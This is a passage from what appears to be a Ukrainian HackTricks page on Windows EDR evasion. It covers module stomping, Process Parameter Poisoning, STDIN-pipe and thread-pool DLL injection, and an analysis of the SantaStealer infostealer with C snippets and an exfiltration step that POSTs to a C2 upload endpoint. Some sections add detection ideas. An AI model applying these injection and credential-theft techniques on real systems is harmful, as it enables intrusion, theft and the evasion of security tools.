Наївний stomping поширених модулів, як-от `uxtheme.dll` або `comctl32.dll`, ненадійний: DLL може бути не завантажена у віддаленому процесі, а надто мала code region призведе до аварійного завершення процесу. Надійніший workflow:

1. Перелічіть модулі цільового процесу та залиште **include list лише з назвами** вже завантажених DLL.
2. Спочатку створіть payload і зафіксуйте його **точний розмір у байтах**.
3. Проскануйте кандидатні DLL на диску та порівняйте **`.text` `Misc_VirtualSize`** PE section із розміром payload. Це важливіше за розмір файла, оскільки відображає розмір executable section **після mapping у пам’ять**.
4. Розберіть **Export Address Table (EAT)** і виберіть RVA експортованої функції як початкове зміщення для stomp.
5. Обчисліть **blast radius**: якщо payload виходить за межі вибраної функції, він перезапише сусідні exports, розташовані далі в пам’яті.

Типові helpers для recon/вибору цілі, що трапляються на практиці:

```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```

Операційні примітки
- Надавайте перевагу DLL, **вже завантаженим** у віддалений процес, щоб уникнути телеметрії `LoadLibrary`/неочікуваного завантаження образів.
- Надавайте перевагу експорту, який цільова програма виконує рідко; інакше звичайні шляхи виконання коду можуть звернутися до змінених байтів до або після створення потоку.
- Для великих імплантів часто потрібно змінити спосіб вбудовування shellcode: замість рядкового літерала використовувати **масив байтів/ініціалізатор у фігурних дужках**, щоб у вихідному коді інжектора було правильно представлено весь буфер.

Ідеї для виявлення
- Віддалений запис у **виконувані сторінки, прив’язані до образу** (`MEM_IMAGE`, `PAGE_EXECUTE*`), замість поширеніших приватних виділень RWX/RX.
- Точки входу експорту, чиї байти в пам’яті більше не відповідають файлу на диску.
- Віддалені потоки або перемикання контексту, що починають виконання всередині експорту легітимної DLL, перші байти якого нещодавно змінено.
- Підозрілі послідовності викликів `VirtualProtect(Ex)` / `WriteProcessMemory` для сторінок `.text` DLL із подальшим створенням потоку.

## Process Parameter Poisoning (P3)

Process Parameter Poisoning (P3) — це техніка **ін’єкції в процес / обходу EDR**, яка уникає класичного шляху віддаленого запису (`VirtualAllocEx` + `WriteProcessMemory`). Замість копіювання байтів у вже запущений процес вона використовує той факт, що Windows **копіює вибрані параметри запуску `CreateProcessW` у дочірній процес** і зберігає їх у `PEB->ProcessParameters` (`RTL_USER_PROCESS_PARAMETERS`).<sup>[[28]](#references)[[29]](#references)</sup>

### Носії даних, які можна отруїти й які копіює `CreateProcessW`

Корисні носії:

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment` (із `CREATE_UNICODE_ENVIRONMENT`) → `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

Практичні обмеження носіїв:

- `lpCommandLine` має вказувати на **доступну для запису пам’ять** для `CreateProcessW`; його довжина обмежена **32,767 символами Unicode**, включно з нуль-термінатором.
- `lpEnvironment` має бути блоком середовища Unicode з послідовних рядків `NAME=VALUE\0`, завершеним додатковим `\0`.
- `lpReserved` офіційно зарезервований, тому відповідність `ShellInfo` слід вважати деталлю реалізації, а не стабільною документованою гарантією.

Так звичайне створення процесу стає **примітивом передавання payload**. Оператор створює дочірній процес із контрольованими зловмисником даними запуску й дозволяє Windows виконати копіювання між процесами.

### Потік віддаленого пошуку без API віддаленого запису

Після створення дочірнього процесу знайдіть скопійований буфер за допомогою **примітивів лише для читання**:

1. `NtQueryInformationProcess(ProcessBasicInformation)` → отримати `PROCESS_BASIC_INFORMATION.PebBaseAddress`
2. Прочитати віддалений `PEB`
3. Перейти за `PEB.ProcessParameters`
4. Прочитати `RTL_USER_PROCESS_PARAMETERS`
5. Використати вибраний вказівник:
   - `parameters.CommandLine.Buffer`
   - `parameters.Environment`
   - `parameters.ShellInfo.Buffer`

Мінімальний потік:

```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```

### Виконання скопійованого буфера параметрів

Скопійована область параметрів зазвичай має права `RW`, а не виконувана. Типовий ланцюжок P3:

1. Створити процес звичайним способом (не призупиняючи його)
2. Зробити вибрану сторінку параметрів виконуваною за допомогою `NtProtectVirtualMemory` / `VirtualProtectEx`
3. Повторно використати дескриптор головного потоку, який уже повернуто в `PROCESS_INFORMATION`
4. Перенаправити виконання за допомогою `NtSetContextThread` (`CONTEXT_CONTROL`, перезаписати `RIP`)

На відміну від класичних сценаріїв перехоплення потоку, тут **не потрібно** викликати `SuspendThread` / `ResumeThread`; контекст можна змінити безпосередньо через дескриптор головного потоку, який було повернуто.

Це дає змогу уникнути кількох API, які часто відстежують під час ін’єкції:

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- часто також `SuspendThread` / `ResumeThread`

### Обмеження нульових байтів і багатоступеневий shellcode

Усі три носії — це **рядкові або подібні до рядків дані**, тому сире навантаження, що містить `0x00`, обрізається під час передавання. Практичний обхідний шлях — **перший етап без нульових байтів**, який відновлює константи під час виконання, а потім завантажує довільний другий етап.

Простий шаблон — синтез констант на основі XOR:

```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```

Це дає змогу першому етапу формувати рядки для стека, аргументи API, шляхи до DLL або завантажувач shellcode другого етапу, не вбудовуючи нульові байти в передаваний параметр.

### Виклики API зі стека на першому етапі

Коли першому етапу потрібно викликати API, як-от `LoadLibraryA`, він може:

- помістити рядок/буфер у стек цільового процесу
- зарезервувати **32-байтову shadow space для x64**
- задати `RCX`, `RDX`, `R8`, `R9` константами або вказівниками відносно `RSP`
- підтримувати **16-байтове вирівнювання** `RSP` перед викликом

Потім другий етап можна скопіювати зі стека в область пам’яті `PAGE_READWRITE`, змінити її захист на `PAGE_EXECUTE_READ` за допомогою `VirtualProtect` і перейти до неї, уникаючи прямого виділення пам’яті RWX.

### Ідеї для виявлення

Автори згадують такі перспективні напрямки пошуку:

- `VirtualProtectEx` / `NtProtectVirtualMemory`, що надають **сторінкам параметрів процесу права на виконання**
- зміна захисту, після якої викликається `SetThreadContext` / `NtSetContextThread`
- віддалене читання `PEB`, а потім `RTL_USER_PROCESS_PARAMETERS`
- незвично довгі значення або значення з високою ентропією в `lpCommandLine`, `lpEnvironment` чи `STARTUPINFO.lpReserved` під час створення процесу

### Примітки

- P3 — це **трюк для передавання даних між процесами**, а не повноцінний примітив виконання сам по собі: скопійованому параметру все ще потрібно надати права на виконання та перенаправити виконання.
- Автори розглядали `RtlCreateProcessReflection` / Dirty Vanity, але відмовилися від цього варіанта, оскільки він внутрішньо використовує підозрілі примітиви, як-от `NtWriteVirtualMemory` і `NtCreateThreadEx`.

## Ін’єкція через канал STDIN консолі

Інтерактивний дочірній процес консолі також можна використовувати як **примітив для передавання payload**. Інжектор перенаправляє стандартний ввід дочірнього процесу в канал і надсилає маркер, за яким іде shellcode. Після того як консольна програма зчитує дані у власну приватну пам’ять, інжектор знаходить цей буфер, надає йому права на виконання та перенаправляє до нього потік дочірнього процесу. Це дає змогу уникнути `VirtualAllocEx` і `WriteProcessMemory`, але все одно йдеться про process injection, а не про універсальний обхід EDR.<sup>[[41]](#references)</sup>

Попри опис як «іменованого каналу», у референсній реалізації викликається `CreatePipe`, що створює **анонімний канал**. Windows внутрішньо реалізує анонімні канали за допомогою об’єктів каналів з унікальними іменами, але PoC ані не вибирає шлях `\\.\pipe\<name>`, ані не викликає `CreateNamedPipe`. Він створює дескриптори, що успадковуються, з дескриптором безпеки за замовчуванням, розміщує дескриптор читання в `STARTUPINFO.hStdInput`, задає `STARTF_USESTDHANDLES` і запускає новий дочірній процес з увімкненим успадкуванням дескрипторів. Отже, цей PoC запускає передану консольну програму, а не під’єднує канал до наявного процесу.<sup>[[41]](#references)[[42]](#references)[[43]](#references)</sup>

### Робочий процес із референсної реалізації

У реалізації використовується такий ланцюжок:<sup>[[41]](#references)</sup>

1. Створити пари анонімних каналів для `STDIN` і `STDOUT` дочірнього процесу. Вимкнути успадкування для двох дескрипторів на боці батьківського процесу, а після створення процесу закрити в батьківському процесі дублікати дескрипторів на боці дочірнього процесу.
2. Запустити інтерактивний виконуваний файл, наприклад `netsh.exe` або `nslookup.exe`, з параметром `CREATE_NEW_CONSOLE`. Дочірній процес успадкує перенаправлені стандартні дескриптори.
3. Надіслати повний бінарний масив `rawData` через дескриптор `STDIN` на боці батьківського процесу за допомогою `WriteFile`. Консольна програма зчитує байти й залишає їхню копію в одній зі своїх приватних виділених областей пам’яті.
4. Переглянути адресний простір дочірнього процесу за допомогою `VirtualQueryEx`, прочитати кандидатні області `MEM_PRIVATE` через `ReadProcessMemory` і знайти маркер на початку `rawData`.
5. Змінити захист виявленого буфера на `PAGE_EXECUTE_READWRITE` за допомогою `VirtualProtectEx`.
6. Визначити головний потік, призупинити його, задати `RIP` значення `found_address + 0x19` за допомогою `NtSetContextThread` і відновити виконання.

```powershell
InjectSetConsole.exe C:\Windows\System32\netsh.exe
```

Надана реалізація призначена лише для x64: вона змінює `CONTEXT.Rip`, а вбудований payload — це x64 shellcode. `rawData` починається з маркера довжиною 25 байтів, тому виконувані байти починаються зі шістнадцяткового зміщення `0x19`. Замінюючи payload, збережіть цю структуру або узгоджено оновіть маркер, вектор пошуку, розмір масиву та зміщення виконання. У коментарях до вихідного коду також зазначено, що `0x0A`, `0x0D` і `0x1A` — це недопустимі символи. Цей процес не змінює токен або привілеї дочірнього процесу.<sup>[[41]](#references)</sup>

Приклади невеликих native helper-ів і шаблонів компіляції payload див. у [Windows C Payloads](windows-local-privilege-escalation/windows-c-payloads.md).

## Ін’єкція DLL через callback пулу потоків без shellcode (DLLParty)

DLLParty адаптує ін’єкцію в пул потоків у стилі PoolParty, щоб змусити наявний worker цільового процесу викликати `LoadLibraryA`, а не виконувати ін’єктовану callback-заглушку. Примітивом диспетчеризації є об’єкт завершення `TP_DIRECT`, поставлений у чергу порту завершення вводу-виводу пулу цільового процесу. Це не обходить дозволи процесу: PoC викликає `OpenProcess(PROCESS_ALL_ACCESS)` і потребує доступу для читання й запису пам’яті цільового процесу, а також можливості дублювати дескриптори worker factory і порту завершення.<sup>[[46]](#references)[[47]](#references)</sup>

У Windows x64 worker передає в `RCX`, першому аргументі callback, вказівник на `TP_CALLBACK_INSTANCE`, розміщений у стеку. `LoadLibraryA` інтерпретує цей самий вказівник як `LPCSTR`. У протестованому сценарії `TppWorkerThread` формує вказівник за адресою `RSP+0x178`, тоді як перший звичайний запис у цей об’єкт відбувається за адресою `RSP+0x1d0`. Тому шлях до DLL із нульовим завершенням, який вміщується у цей префікс розміром 0x58 байтів, можна розмістити на початку екземпляра, і до диспетчеризації його не буде перезаписано. Це спостереження стосується конкретної збірки й не є задокументованою гарантією ABI Windows.<sup>[[46]](#references)[[47]](#references)</sup>

Довідковий процес такий:<sup>[[46]](#references)[[47]](#references)</sup>

1. Перелічіть дескриптори цільового процесу за допомогою `NtQuerySystemInformation(SystemHandleInformation)` і визначте `TpWorkerFactory`, запитавши типи об’єктів. Дублюйте дескриптор worker factory та запитайте `WorkerFactoryBasicInformation`; поле `StartParameter` містить адресу віддаленого `TP_POOL`. Пропускайте worker factory, для яких `TotalWorkerCount == 0`.
2. Прочитайте `TP_POOL.CompletionPort` і пройдіть приватний список worker-ів пулу. У протестованій збірці Windows 10 19045 x64 (`ntdll.dll 10.0.19041.4842`) його голова розташована за адресою `pool+0x60`; кожне посилання — за адресою `worker+0x10`, тож слот callback-instance за адресою `worker+0x38` дорівнює `link+0x28`. PoC перевіряє вирівнювання вказівників, взаємність посилань, належність до пулу, ненульові ідентифікатори потоків, повторювані вузли та незмінність голови списку.
3. Запишіть шлях до DLL у **кожен** знайдений слот worker-а, оскільки поставлене в чергу завершення може бути оброблене будь-яким worker-ом. Розмістіть `TP_DIRECT` у доступній для запису пам’яті цільового процесу, задавши `Callback = LoadLibraryA`. PoC використовує `last_slot-0x500` у стеку worker-а замість `VirtualAllocEx`; це зміщення визначене експериментально й не має конфліктувати з активними даними стека.
4. Дублюйте дескриптор порту завершення цільового процесу та викличте `ZwSetIoCompletion(port, remote_direct, 0, 0, 0)`. Адреса віддаленого `TP_DIRECT` є ключем завершення. Після цього наявний worker викликає `LoadLibraryA` з перезаписаним вказівником на callback-instance і завантажує DLL, доступну цільовому процесу.

PoC приймає PID цільового процесу (`DLLParty.exe <target_pid>`) і використовує жорстко заданий шлях до DLL у `DLLParty.cpp`; перед збиранням виконуваного файлу x64 укажіть шлях, доступний цільовому процесу. Також як віддалений callback використовується адреса `LoadLibraryA` з власного процесу, тож передбачається, що ця адреса дійсна й у цільовому процесі. Код не перевіряє, чи вміщується шлях у префікс розміром 0x58 байтів, і чи знайшов обхід списку worker-ів хоча б один слот перед індексацією останнього елемента. Повторно перевірте приватні зміщення, структуру стека та доступний для запису простір для потрібної збірки. Відмова від `CreateRemoteThreadEx`, shellcode і `VirtualAllocEx` не усуває міжпроцесний запис або телеметрію завантаження DLL.<sup>[[46]](#references)[[47]](#references)</sup>

## Тактики SantaStealer для безфайлового ухилення та викрадення облікових даних

SantaStealer (він же BluelineStealer) демонструє, як сучасні викрадачі інформації поєднують обхід AV, протидію аналізу та доступ до облікових даних в одному процесі.<sup>[[24]](#references)</sup>

### Фільтрація за розкладкою клавіатури та затримка в sandbox

- Прапорець конфігурації (`anti_cis`) перелічує встановлені розкладки клавіатури через `GetKeyboardLayoutList`. Якщо виявлено кириличну розкладку, зразок створює порожній маркер `CIS` і завершує роботу до запуску крадіїв, не активуючись у виключених локалях, але залишаючи артефакт для пошуку.

```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
    LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
    if (lang == LANG_RUSSIAN) {
        CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
        ExitProcess(0);
    }
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```

### Багаторівнева логіка `check_antivm`

- Варіант A обходить список процесів, хешує кожну назву за допомогою власної rolling checksum і порівнює результат із вбудованими списками блокування debugger/sandbox; потім повторює обчислення checksum для імені комп’ютера та перевіряє робочі каталоги, наприклад `C:\analysis`.
- Варіант B перевіряє системні властивості (мінімальну кількість процесів, недавній час роботи системи), викликає `OpenServiceA("VBoxGuest")` для виявлення VirtualBox additions і виконує перевірки часу навколо затримок, щоб виявити покрокове виконання. Якщо спрацьовує будь-яка перевірка, виконання переривається до запуску модулів.

### Fileless helper + подвійне reflective loading із ChaCha20

- Основна DLL/EXE містить Chromium credential helper, який або записується на диск, або вручну відображається в пам’яті; у fileless-режимі він самостійно розв’язує імпорти та релокації, тож жодних артефактів helper не створюється.
- Цей helper зберігає DLL другого етапу, двічі зашифровану ChaCha20 (два 32-байтові ключі та 12-байтові nonce). Після обох етапів розшифрування він reflectively завантажує blob (без `LoadLibrary`) і викликає експорти `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup`, похідні від [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).<sup>[[25]](#references)</sup>
- Процедури ChromElevator використовують reflective process hollowing із direct syscall для впровадження в активний браузер Chromium, успадковують ключі AppBound Encryption і розшифровують паролі, cookie та дані кредитних карток безпосередньо з баз даних SQLite, попри захист ABE.

### Модульний збір у пам’яті та chunked HTTP exfil

- `create_memory_based_log` перебирає глобальну таблицю вказівників на функції `memory_generators` і запускає по одному потоку для кожного ввімкненого модуля (Telegram, Discord, Steam, знімки екрана, документи, розширення браузера тощо). Кожен потік записує результати у спільні буфери та повідомляє кількість файлів після приблизно 45-секундного очікування на завершення потоків.
- Після завершення всі дані архівуються за допомогою статично скомпонованої бібліотеки `miniz` у `%TEMP%\\Log.zip`. Потім `ThreadPayload1` чекає 15 секунд і передає архів частинами по 10 MB через HTTP POST на `http://<C2>:6767/upload`, підробляючи boundary браузера `multipart/form-data` (`----WebKitFormBoundary***`). До кожної частини додаються `User-Agent: upload`, `auth: <build_id>` та необов’язкове `w: <campaign_tag>`, а до останньої частини додається `complete: true`, щоб C2 знав, що повторне збирання завершено.

## References

- [1] [Просунуті прийоми ухилення: точне підміщення модулів](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [2] [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [3] [Crystal Kit – блог](https://rastamouse.me/crystal-kit/)
- [4] [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [5] [Elastic – стеки викликів: більше жодних поблажок для malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [6] [Crystal Palace – документація](https://tradecraftgarden.org/docs.html)
- [7] [simplehook – приклад](https://tradecraftgarden.org/simplehook.html)
- [8] [stackcutting – приклад](https://tradecraftgarden.org/stackcutting.html)
- [9] [Draugr – PIC для підроблення стека викликів](https://github.com/NtDallas/Draugr)
- [10] [Unit42 – новий ланцюжок зараження та обфускація на основі ConfuserEx для викрадача даних DarkCloud](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [11] [Synacktiv – чи варто довіряти zero trust? Обхід перевірок стану пристрою Zscaler](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [12] [Check Point Research – до ToolShell: дослідження попередніх ransomware-операцій Storm-2603](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [13] [Hexacorn – DLL ForwardSideLoading: зловживання forwarded exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [14] [Перелік forwarded exports у Windows 11 (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [15] [Microsoft Learn – порядок пошуку dynamic-link library](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [16] [Microsoft Learn – безпека процесів і права доступу](https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)
- [17] [Microsoft – довідник EKU (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [18] [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [19] [Запускач CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [20] [Zero Salarium – протидія EDR за допомогою Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [21] [Zero Salarium – обхід захисного механізму Windows Defender за допомогою перенаправлення папок](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [22] [Microsoft – довідник команди mklink](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [23] [Check Point Research – за завісою Pure: від RAT до builder і розробника](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [24] [Rapid7 – SantaStealer завітає до міста: новий амбітний викрадач інформації](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [25] [ChromElevator – розшифрування Chrome App Bound Encryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [26] [Check Point Research – GachiLoader: протидія malware на Node.js за допомогою трасування API](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [27] [Спляча красуня: приспати Adaptix за допомогою Crystal Palace](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [28] [SensePost – отруєння параметрів процесу](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [29] [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [30] [Спляча красуня II: CFG, CET і підроблення стека](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [31] [Обфускація сну Ekko](https://github.com/Cracked5pider/Ekko)
- [32] [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)
- [33] [blog.xpnsec.com — приховування Dotnet Etw](https://blog.xpnsec.com/hiding-your-dotnet-etw)
- [34] [repnz/etw-providers-docs](https://github.com/repnz/etw-providers-docs)
- [35] [trustedsec.com — зловживання Chrome Remote Desktop під час Red Team-операцій: практичний посібник](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)
- [36] [Check Point Research — BTR Reforged: перетворення драйвера виправлення Defender на примітив для операцій у ядрі](https://research.checkpoint.com/2026/btr-reforged-weaponizing-defenders-remediation-driver-as-a-kernel-operation-primitive/)
- [37] [Dump-GUY — BTR_CLI](https://github.com/Dump-GUY/BTR_CLI)
- [38] [Супровідний код MDSec Function Peekaboo](https://github.com/mdsecactivebreach/functionpeekaboo)
- [39] [MDSec — Function Peekaboo: створення функцій із самоприховуванням за допомогою LLVM](https://mdsec.co.uk/2025/10/function-peekaboo-crafting-self-masking-functions-using-llvm/)
- [40] [Microsoft Learn — VirtualProtect](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)
- [41] [Вихідний код InjectSetConsole від TwoSevenOneT](https://github.com/TwoSevenOneT/InjectSetConsole)
- [42] [Microsoft Learn — функція CreatePipe](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-createpipe)
- [43] [Microsoft Learn — створення дочірнього процесу з перенаправленням введення та виведення](https://learn.microsoft.com/en-us/windows/win32/procthread/creating-a-child-process-with-redirected-input-and-output)
- [44] [Praetorian — некромантія GhostPack: переробка інструментів C# за допомогою WasmForge](https://praetorian.com/blog/wasmforge-csharp-ghostpack-edr-evasion)
- [45] [WasmForge — компіляція проєктів C# / .NET](https://github.com/praetorian-inc/wasmforge/blob/main/docs/CSHARP.md)
- [46] [Підтвердження концепції та вихідний код DLLParty](https://github.com/epersic/DLLParty)
- [47] [DLLParty — зловживання внутрішніми механізмами thread pool для впровадження DLL без shellcode](https://medium.com/@persic.eno/dllparty-abusing-thread-pool-internals-for-shellcodeless-dll-injection-7c84106f7745)
- [48] [Набір даних для тестування EMBER2024 та інструменти thrember](https://github.com/FutureComputing4AI/EMBER2024)
- [49] [Використання EMBER2024 для оцінювання імплантів Red Team](https://mez0.cc/posts/evaluating-implants-with-ember/)
- [50] [MSec Operations – ухилення від виявлення на основі машинного навчання](https://msecops.de/blog/posts/ml-evasion/)
{{#include ../banners/hacktricks-training.md}}
